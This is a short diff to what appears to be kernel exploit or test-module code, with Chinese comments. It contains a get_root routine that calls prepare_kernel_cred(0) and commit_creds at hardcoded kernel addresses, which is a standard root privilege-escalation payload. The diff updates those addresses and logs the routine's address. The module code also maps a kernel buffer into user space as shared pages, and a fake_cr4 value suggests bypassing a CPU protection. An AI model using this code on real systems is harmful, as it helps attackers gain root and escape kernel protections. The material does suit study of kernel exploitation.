@@ -47,8 +47,8 @@ size_t fake_cr4=0x407f0;
 
 void get_root(void)
 {
-	size_t prepare_kernel_cred_addr=0xffffffc0000d2d60;
- 	size_t commit_creds_addr=0xffffffc0000d2800;
+	size_t prepare_kernel_cred_addr=0xffffffc0000b3d60;
+ 	size_t commit_creds_addr=0xffffffc0000b3878;
 	char* (*pkc)(int) = prepare_kernel_cred_addr;
 	void (*cc)(char*) = commit_creds_addr;
 	(*cc)((*pkc)(0));
@@ -83,9 +83,11 @@ unsigned long size = (unsigned long)(vma->vm_end - vma->vm_start);
 ptr=get_time_show;
 //得到物理地址 
 printk("get_time_show_ptr address: 0x%llx and buffer address: 0x%llx \n",&ptr,&buffer);
-klog_sprintf("get_time_show_ptr address: 0x%llx and buffer address: 0x%llx \n",&ptr,&buffer);
+klog_sprintf("get_time_show_ptr address: 0x%p and buffer address: 0x%p \n",&ptr,&buffer);
 showdatemap(&buffer,20);
 showdate(&buffer,20);
+klog_sprintf("get_root address: 0x%p \n",get_root);
+showdatebyterw(&get_root,20);
 page = virt_to_phys(buffer); //buffer
 //将用户空间的一个vma虚拟内存区映射到以page开始的一段连续物理页面上 
 if(remap_pfn_range(vma,start,page>>PAGE_SHIFT,size,PAGE_SHARED))//第三个参数是页帧号，由物理地址右移PAGE_SHIFT得到 
